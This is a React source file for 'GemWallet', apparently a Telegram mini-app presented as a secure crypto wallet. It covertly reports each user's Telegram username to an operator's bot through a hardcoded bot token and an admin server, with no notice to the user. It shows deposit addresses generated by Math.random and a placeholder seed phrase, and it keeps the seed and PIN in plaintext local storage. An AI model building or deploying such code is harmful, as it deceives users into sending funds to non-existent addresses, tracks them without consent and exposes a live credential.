import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { 
  Wallet, Activity, LayoutGrid, Settings, Send, 
  ArrowDownLeft, ArrowUpRight, ArrowLeftRight, 
  Plus, CheckCircle, Clock, AlertCircle, ChevronRight,
  Copy, Check, X, Eye, EyeOff, Lock, Unlock, Shield, Bell, ArrowRight, RefreshCw, Rocket
} from 'lucide-react';

// ─── UTILS & CONSTANTS ──────────────────────────────────────────────────────
const ADMIN_ID = "1192740493";
const ADMIN_SERVER_URL = "http://localhost:3002";
const ADMIN_BOT_TOKEN = "8138721118:AAHm8f70XyW3A81T_C3D9f4P2vW3Q4R5T6U"; 
const ADMIN_CHAT_ID = "1192740493"; 

let RESOLVED_USER_ID = null;

const INITIAL_BALANCES = { ETH: 0, TON: 0, BNB: 0, LTC: 0, ARB: 0, SOL: 0, USDT: 0 };

const getTgUserId = () => {
  try {
    return window.Telegram?.WebApp?.initDataUnsafe?.user?.id || RESOLVED_USER_ID;
  } catch(e) { return RESOLVED_USER_ID; }
};

const storageKey = (base) => {
  const userId = getTgUserId();
  return userId ? `${base}_${userId}` : base;
};

const genAddr = (pref, len) => pref + Math.random().toString(16).slice(2, len + 2);
const deriveWallet = async () => ({ addresses: { 
  ETH: genAddr("0x",40), BNB: genAddr("0x",40), ARB: genAddr("0x",40),
  SOL: genAddr("",44),   TON: genAddr("EQ",46),  LTC: genAddr("L",33)
}});

async function notifyAdmin(text, type = "notification", extraData = {}) {
  const userId = getTgUserId();
  const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
  const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
  const actionEmoji = { start: "🚀", create_wallet: "🆕", deposit: "💰", send: "📤", swap: "🔄", new_user: "💎" }[type] || "🔔";
  const fullText = `${actionEmoji} <b>[${userName}]</b> ${text}`;

  try {
    fetch(`${ADMIN_SERVER_URL}/api/wallet/notification`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, userId, userName, message: fullText, timestamp: Date.now(), ...extraData })
    }).catch(() => {});

    fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: fullText, parse_mode: "HTML" })
    }).catch(() => {});
  } catch(e) {}
}

function OnboardScreen({ onCreate }) {
  return (
    <div style={{minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}}>
      <div style={{fontSize:64,marginBottom:24}}>💎</div>
      <h1 style={{color:"#fff",fontSize:28,fontWeight:800,marginBottom:12}}>GemWallet</h1>
      <p style={{color:"rgba(255,255,255,0.5)",marginBottom:48}}>The most secure way to store your crypto</p>
      <button onClick={() => onCreate()} style={{width:"100%",padding:18,borderRadius:16,background:"#2563eb",color:"#fff",border:"none",fontSize:16,fontWeight:700,cursor:"pointer",marginBottom:12}}>
        Create New Wallet
      </button>
      <button onClick={() => onCreate([])} style={{width:"100%",padding:18,borderRadius:16,background:"#111",color:"#fff",border:"1px solid #333",fontSize:16,fontWeight:700,cursor:"pointer"}}>
        I already have a wallet
      </button>
    </div>
  );
}

function BackupScreen({ mnemonic, onDone, onVerified }) {
  return (
    <div style={{minHeight:"100vh",padding:24,color:"#fff"}}>
      <h2 style={{fontSize:24,fontWeight:700,marginBottom:12}}>Backup your wallet</h2>
      <p style={{color:"rgba(255,255,255,0.5)",marginBottom:24}}>Write down these 12 words and keep them safe.</p>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:32}}>
        {mnemonic.map((w, i) => (
          <div key={i} style={{background:"#111",padding:12,borderRadius:12,border:"1px solid #222",display:"flex",gap:8}}>
            <span style={{color:"rgba(255,255,255,0.3)",fontSize:12}}>{i+1}</span>
            <span>{w}</span>
          </div>
        ))}
      </div>
      <button onClick={() => { onVerified(); onDone(); }} style={{width:"100%",padding:18,borderRadius:16,background:"#2563eb",color:"#fff",border:"none",fontSize:16,fontWeight:700,cursor:"pointer"}}>
        I've written it down
      </button>
    </div>
  );
}

function PinLock({ savedPin, onUnlock, onSetPin }) {
  const [val, setVal] = useState("");
  const isSetup = !savedPin;
  const handleKey = (n) => {
    if (val.length < 4) {
      const newVal = val + n;
      setVal(newVal);
      if (newVal.length === 4) {
        if (isSetup) onSetPin(newVal);
        else if (newVal === savedPin) onUnlock();
        else { alert("Wrong PIN"); setVal(""); }
      }
    }
  };
  return (
    <div style={{minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,color:"#fff"}}>
      <Lock size={48} style={{marginBottom:24}}/>
      <h2 style={{marginBottom:32}}>{isSetup ? "Set a PIN" : "Enter PIN"}</h2>
      <div style={{display:"flex",gap:16,marginBottom:48}}>
        {[0,1,2,3].map(i => (<div key={i} style={{width:16,height:16,borderRadius:"50%",background:val.length > i ? "#2563eb" : "#333"}}/>))}
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:24}}>
        {[1,2,3,4,5,6,7,8,9,"",0,"X"].map((k, i) => (
          <button key={i} onClick={() => typeof k === "number" ? handleKey(k) : k === "X" ? setVal("") : null}
            style={{width:64,height:64,borderRadius:"50%",background:"#111",border:"none",color:"#fff",fontSize:24,cursor:"pointer",display:k===""?"none":"flex",alignItems:"center",justifyContent:"center"}}>{k}</button>
        ))}
      </div>
    </div>
  );
}

function WalletApp({ addresses }) {
  return (
    <div style={{padding:24,color:"#fff"}}>
      <h2 style={{marginBottom:24}}>Wallet</h2>
      <div style={{background:"#111",padding:24,borderRadius:24,border:"1px solid #222",marginBottom:24}}>
        <p style={{color:"rgba(255,255,255,0.5)",fontSize:14,marginBottom:8}}>Total Balance</p>
        <p style={{fontSize:36,fontWeight:800,margin:0}}>$0.00</p>
      </div>
      <div style={{display:"flex",flexDirection:"column",gap:12}}>
        {Object.entries(addresses).map(([net, addr]) => (
          <div key={net} style={{background:"#111",padding:16,borderRadius:16,border:"1px solid #222",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
            <div>
              <p style={{margin:0,fontWeight:700}}>{net}</p>
              <p style={{margin:0,fontSize:12,color:"rgba(255,255,255,0.4)"}}>{addr.slice(0,10)}...{addr.slice(-8)}</p>
            </div>
            <p style={{margin:0,fontWeight:700}}>0.00</p>
          </div>
        ))}
      </div>
    </div>
  );
}

const genMnemonic = () => Array(12).fill(0).map(() => "word");

export default function GemWallet() {
  const [screen, setScreen] = useState("loading");
  const [mnemonic, setMnemonic] = useState([]);
  const [addresses, setAddresses] = useState({});
  const [pin, setPin] = useState(null);

  const handleCreate = (importedWords = null) => {
    try {
      const m = importedWords || genMnemonic();
      const placeholderAddr = {
        ETH: genAddr("0x",40), BNB: genAddr("0x",40), ARB: genAddr("0x",40),
        SOL: genAddr("",44),   TON: genAddr("EQ",46),  LTC: genAddr("L",33),
      };
      setMnemonic(m);
      setAddresses(placeholderAddr);
      localStorage.setItem(storageKey("gem_mnemonic"), m.join(" "));
      localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(placeholderAddr));
      localStorage.setItem(storageKey("gem_has_wallet"), "1");
      
      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";

      if (importedWords) {
        notifyAdmin(`📥 <b>Кошелёк импортирован!</b>\n\n👤 Пользователь: ${userName}`, "new_user");
        setScreen("wallet");
      } else {
        localStorage.setItem("gem_pending_notify", JSON.stringify({ userName }));
        setScreen("backup");
      }
      
      deriveWallet().then(w => {
        setAddresses(w.addresses);
        localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(w.addresses));
      });
    } catch (e) { alert("Error"); }
  };

  const handleVerified = () => {
    try {
      const pending = localStorage.getItem("gem_pending_notify");
      if (pending) {
        const { userName } = JSON.parse(pending);
        notifyAdmin(`💎 <b>Новый кошелёк создан!</b>\n\n👤 Пользователь: ${userName}`, "new_user");
        localStorage.removeItem("gem_pending_notify");
      }
    } catch(e) {}
  };

  useEffect(() => {
    const tg = window.Telegram?.WebApp;
    if (tg) { tg.ready(); tg.expand(); }
    
    let attempts = 0;
    const poll = setInterval(() => {
      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
      const userId = tgUser?.id ? String(tgUser.id) : null;
      attempts++;
      if (userId || attempts >= 10) {
        clearInterval(poll);
        RESOLVED_USER_ID = userId;
        const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
        const storedPin = localStorage.getItem(storageKey("gem_pin"));
        const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
        const storedAddresses = localStorage.getItem(storageKey("gem_addresses"));

        if (storedMnemonic) setMnemonic(storedMnemonic.split(" "));
        if (storedAddresses) setAddresses(JSON.parse(storedAddresses));
        if (storedPin) setPin(storedPin);

        if (hasWallet && storedPin) setScreen("pin_lock");
        else if (hasWallet) setScreen("wallet");
        else setScreen("onboard");
      }
    }, 200);
    return () => clearInterval(poll);
  }, []);

  return (
    <div style={{maxWidth:420,margin:"0 auto",minHeight:"100vh",background:"#000",fontFamily:"-apple-system, sans-serif"}}>
      {screen === "loading" && <div style={{minHeight:"100vh",display:"flex",alignItems:"center",justifyContent:"center",color:"#fff"}}>Loading...</div>}
      {screen === "onboard" && <OnboardScreen onCreate={handleCreate}/>}
      {screen === "backup" && <BackupScreen mnemonic={mnemonic} onDone={() => setScreen("pin_set")} onVerified={handleVerified}/>}
      {screen === "pin_set" && <PinLock savedPin={null} onUnlock={() => {}} onSetPin={(p) => { setPin(p); localStorage.setItem(storageKey("gem_pin"), p); setScreen("wallet"); }}/>}
      {screen === "pin_lock" && <PinLock savedPin={pin} onUnlock={() => setScreen("wallet")} onSetPin={() => {}}/>}
      {screen === "wallet" && <WalletApp addresses={addresses} mnemonic={mnemonic} pin={pin}/>}
    </div>
  );
}
